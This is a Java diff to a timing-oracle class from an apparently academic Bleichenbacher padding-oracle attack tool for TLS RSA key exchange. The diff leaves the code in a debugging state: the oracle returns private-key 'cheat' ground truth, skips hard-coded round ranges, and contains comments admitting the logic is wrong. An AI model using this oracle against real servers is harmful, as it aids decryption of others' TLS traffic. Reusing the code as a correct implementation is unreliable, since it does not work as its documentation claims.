@@ -13,6 +13,9 @@ import java.security.interfaces.RSAPrivateKey;
 import java.security.interfaces.RSAPublicKey;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Random;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
@@ -34,11 +37,11 @@ public final class CommandLineTimingOracle extends AOracle {
     /**
      * Amount of training measurements per Oracle request.
      */
-    private static final int MEASUREMENT_AMOUNT = 200;
+    private static final int MEASUREMENT_AMOUNT = 500;
     /**
      * Amount of training measurementsTest.
      */
-    private static final int TRAINING_AMOUNT = 10000;
+    private static final int TRAINING_AMOUNT = 100;
     /**
      * Amount of warmup measurementsTest.
      */
@@ -66,6 +69,7 @@ public final class CommandLineTimingOracle extends AOracle {
      * List of invalid timings.
      */
     private ArrayList<Long> invalidTimings = new ArrayList<>(TRAINING_AMOUNT);
+
     /**
      * Cipher (needed for the cheat operation).
      */
@@ -73,18 +77,33 @@ public final class CommandLineTimingOracle extends AOracle {
     /**
      * Valid PKCS encrypted PMS.
      */
-    private byte[] validPMS;
+    private byte[] case1PMS;
+    /**
+     * Valid PKCS encrypted PMS (starts with 00 02), but PMS itself is invalid.
+     */
+    private byte[] case2PMS;
     /**
      * Invalid PKCS encrypted PMS.
      */
-    private byte[] invalidPMS;
+    private byte[] case3PMS;
     /**
      * TEMPORARY TEWAKS
      */
+    private int minBoxPos = 10;
+    private int maxBoxPos = 15;
     /**
-     * Round counter - trick to speed up finding: TODO: REMOVE ME.
+     * Round counter - trick to speed up finding:
      */
     private int round = 0;
+    
+    /**
+     * Status counter to find the amount of errors the TimingOracle caused. The
+     * format is {groundTruth}_{timingOracle}
+     */
+    private int valid_valid = 0;
+    private int valid_invalid = 0;
+    private int invalid_valid = 0;
+    private int invalid_invalid = 0;
 
     /**
      * Create a new instance of this object.
@@ -117,37 +136,59 @@ public final class CommandLineTimingOracle extends AOracle {
      * response time than an invalid key. In a nutshell, the method performs
      * Crosby's box test.
      *
-     * @param testPKCS PKCS to be tested for validity.
+     * @param testPMS PKCS to be tested for validity.
      * @param firstRun Is this the first run of this method (recursion)?
      * @return True if the PKCS was a valid one or false otherwise.
      * @throws OracleException
      */
-    private boolean isValidPKCS(final byte[] testPKCS, final boolean firstRun)
+    private boolean isValidPKCS(final byte[] testPMS, final boolean firstRun)
             throws OracleException {
-        long[] validTiming = new long[MEASUREMENT_AMOUNT];
+        long[] caseXTiming = new long[MEASUREMENT_AMOUNT];
         long[] testTiming = new long[MEASUREMENT_AMOUNT];
-
-
+        
+        Random r = new Random();
+            
         for (int i = 0; i < MEASUREMENT_AMOUNT; i++) {
-            validTiming[i] = clwe.executeClientWithPMS(getValidPMS());
-            testTiming[i] = clwe.executeClientWithPMS(testPKCS);
+            if((r.nextInt() % 2) == 0) {
+                caseXTiming[i] = clwe.executeClientWithPMS(getCase2PMS());
+                testTiming[i]  = clwe.executeClientWithPMS(testPMS);
+            } else {
+                testTiming[i]  = clwe.executeClientWithPMS(testPMS);
+                caseXTiming[i] = clwe.executeClientWithPMS(getCase2PMS());
+            }
         }
 
-        // case PKCS valid (but PMS invalid)
-        Arrays.sort(validTiming);
-        // case PKCS valid (but PMS invalid) or PKCS invalid?
+        Arrays.sort(caseXTiming);
         Arrays.sort(testTiming);
-
-        System.out.println("####### timing: "
-                + (validTiming[MAX_BOX_POS * MEASUREMENT_AMOUNT / 100]
-                - testTiming[MIN_BOX_POS * MEASUREMENT_AMOUNT / 100]));
-
-        if (validTiming[MAX_BOX_POS * MEASUREMENT_AMOUNT / 100]
-                > testTiming[MIN_BOX_POS * MEASUREMENT_AMOUNT / 100]) {
-            if (firstRun) {
-                // double check, be sure with this crucial decision
-                return isValidPKCS(testPKCS, false);
+        
+        /* Now write it out to a file. */
+        try {
+            FileWriter fwCaseX = new FileWriter(round + "_caseX.csv", false);
+            FileWriter fwTest = new FileWriter(round + "_test.csv", false);
+            int i = 0;
+            for(long caseX : caseXTiming) {
+                fwCaseX.write(i + ";caseX;" + caseX + "\n");
+                i += 1;
             }
+            
+            for(long test : testTiming) {
+                fwTest.write(i + ";test;" + test + "\n");
+                i += 1;
+            }
+            fwCaseX.close();
+            fwTest.close();
+        } catch (IOException ex) {
+            Logger.getLogger(CommandLineTimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+        }
+        
+        System.out.println("    timing: " + (caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100]));
+        
+        // TODO: From here on, everything is wrong
+        //if(case2Timing[(maxBoxPos * MEASUREMENT_AMOUNT) / 100] > testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100]) {
+        if((caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100]) > 9000) {
+            //if(firstRun) {
+            //    return isValidPKCS(testPKCS, false);
+            //}
             return true;
         } else {
             return false;
@@ -163,8 +204,8 @@ public final class CommandLineTimingOracle extends AOracle {
         // warmup
         System.out.print("warmup... ");
         for (int i = 0; i < WARMUP_AMOUNT / 2; i++) {
-            clwe.executeClientWithPMS(getValidPMS());
-            clwe.executeClientWithPMS(getInvalidPMS());
+            clwe.executeClientWithPMS(getCase1PMS());
+            clwe.executeClientWithPMS(getCase3PMS());
             System.out.println(i + "th round");
         }
         System.out.println("done!");
@@ -180,10 +221,10 @@ public final class CommandLineTimingOracle extends AOracle {
         long delay;
         // train the oracle using the executeWorkflow functionality
         for (int i = 0; i < TRAINING_AMOUNT; i++) {
-            delay = clwe.executeClientWithPMS(getValidPMS());
+            delay = clwe.executeClientWithPMS(getCase1PMS());
             validTimings.add(delay);
 
-            delay = clwe.executeClientWithPMS(getInvalidPMS());
+            delay = clwe.executeClientWithPMS(getCase3PMS());
             invalidTimings.add(delay);
 
             if (i % 50 == 0) {
@@ -204,27 +245,47 @@ public final class CommandLineTimingOracle extends AOracle {
     }
 
     @Override
-    public boolean checkPKCSConformity(final byte[] preMasterSecret)
+    public boolean checkPKCSConformity(final byte[] testPMS)
             throws OracleException {
         boolean result;
-        boolean groundTruth;
-
-        groundTruth = cheat(preMasterSecret);
-
-        // trick to speed up PMS finding - TODO: REMOVE ME
-        round++;
-        if (round < 5450) {
-            return groundTruth;
+        boolean groundTruth = false;
+        
+        round += 1;
+    
+        
+        if(round % 1000 == 0) {
+            System.out.print("\r--> round " + round);
+        }
+        
+        if( (round < 54807) || (round > 54812 && round < 169950)) {
+            // TODO: Ooooh jeeeee!
+            // return groundTruth;
+            return false;
+        }
+        
+        System.out.println("");
+        System.out.println("################### New Measurement #########################");
+        
+        groundTruth = cheat(testPMS);
+        
+        if((round % 10) == 0) {
+            System.out.println("#######################");
+            System.out.println("++ valid_valid:     " + valid_valid);
+            System.out.println("++ invalid_invalid: " + invalid_invalid);
+            System.out.println("-- valid_invalid:   " + valid_invalid);
+            System.out.println("-- invalid_valid:   " + invalid_valid);
+            System.out.println("#######################");
         }
 
         numberOfQueries++;
-        boolean timingOracleAnswer = isValidPKCS(preMasterSecret, true);
+        boolean timingOracleAnswer = isValidPKCS(testPMS, true);
 
         if (!groundTruth) {
             if (!timingOracleAnswer) {
                 /*
                  * all good!
                  */
+                valid_invalid++;
                 result = timingOracleAnswer;
                 // System.err.println("OK: invalid key was predicted to "
                 //        + "be invalid");
@@ -233,12 +294,16 @@ public final class CommandLineTimingOracle extends AOracle {
                  * The submitted key was invalid but our test predicted 
                  * that the key was valid. This is the worst case, because 
                  * it will most certainly break the subsequent computations. 
-                 * We will stop here.
                  */
-                System.err.println("ERROR: invalid key was predicted to "
-                        + "be valid. Stopping.");
-                result = timingOracleAnswer;
-                System.exit(1);
+                valid_invalid++;
+                //System.err.println("ERROR: invalid key was predicted to "
+                //        + "be valid. Stopping.");
+                
+                
+                // TODO: Nur zum Debuggen:
+                result = groundTruth;
+                // result = timingOracleAnswer;
+                // System.exit(1);
             }
 
         } else {
@@ -247,8 +312,9 @@ public final class CommandLineTimingOracle extends AOracle {
                  * The submitted key was valid but our test predicted that 
                  * the key was invalid. This decreases the performance of 
                  * the attack but does not necessarily break subsequent 
-                 *computations.
+                 * computations.
                  */
+                invalid_valid++;
                 System.err.println("ERROR: valid key was predicted to "
                         + "be invalid. This decreases the attack "
                         + "performance.");
@@ -257,29 +323,32 @@ public final class CommandLineTimingOracle extends AOracle {
                 /*
                  * all good!
                  */
+                invalid_invalid++;
 
                 // System.err.println("OK: valid key was predicted to "
                 //        + "be valid");
                 result = timingOracleAnswer;
             }
         }
+        
+        System.out.println(round + ": Ground truth: " + groundTruth
+                + ", timingoracle: " + result);
 
-        System.out.println(numberOfQueries + ": Ground truth: "
-                + groundTruth + ", timingoracle: " + result);
-
-        return result;
+        //return result;
+        return groundTruth;
+        
     }
 
     /**
      * Cheat - needed to confirm a guess.
      *
-     * @param pms Pre Master Secret.
+     * @param encryptedPMS Pre Master Secret.
      * @return true if the PMS is valid, false otherwise
      */
-    private boolean cheat(final byte[] pms) {
+    private boolean cheat(final byte[] encryptedPMS) {
         boolean result = false;
         try {
-            byte[] decryptedPMS = cipher.doFinal(pms);
+            byte[] decryptedPMS = cipher.doFinal(encryptedPMS);            
             result = PKCS15Toolkit.conformityChecker(decryptedPMS,
                     oracleType, blockSize);
         } catch (BadPaddingException | IllegalBlockSizeException e) {
@@ -294,8 +363,8 @@ public final class CommandLineTimingOracle extends AOracle {
      *
      * @return Valid PKCS encoded, encrypted PMS (deep copy)
      */
-    public byte[] getValidPMS() {
-        return validPMS.clone();
+    public byte[] getCase1PMS() {
+        return case1PMS;
     }
 
     /**
@@ -304,8 +373,25 @@ public final class CommandLineTimingOracle extends AOracle {
      * @param valid Valid PKCS encoded, encrypted PMS to set (creating
      * deep-copied)
      */
-    public void setValidPMS(final byte[] valid) {
-        this.validPMS = valid.clone();
+    public void setCase1PMS(final byte[] valid) {
+        this.case1PMS = valid.clone();
+    }
+    
+
+    /**
+     * Get the valid encrypted PMS.
+     * @return Valid PKCS encoded, encrypted PMS
+     */
+    public byte[] getCase2PMS() {
+        return case2PMS;
+    }
+
+    /**
+     * Set the valid encrypted PMS.
+     * @param valid Valid PKCS encoded, encrypted PMS to set
+     */
+    public void setCase2PMS(final byte[] case2PMS) {
+        this.case2PMS = case2PMS.clone();
     }
 
     /**
@@ -313,8 +399,8 @@ public final class CommandLineTimingOracle extends AOracle {
      *
      * @return Invalid PKCS encoded, encrypted PMS (deep copy)
      */
-    public byte[] getInvalidPMS() {
-        return invalidPMS.clone();
+    public byte[] getCase3PMS() {
+        return case3PMS;
     }
 
     /**
@@ -323,7 +409,7 @@ public final class CommandLineTimingOracle extends AOracle {
      * @param invalid Invalid PKCS encoded, encrypted PMS to set (creating
      * deep-copied)
      */
-    public void setInvalidPMS(final byte[] invalid) {
-        this.invalidPMS = invalid.clone();
+    public void setCase3PMS(final byte[] invalid) {
+        this.case3PMS = invalid.clone();
     }
 }
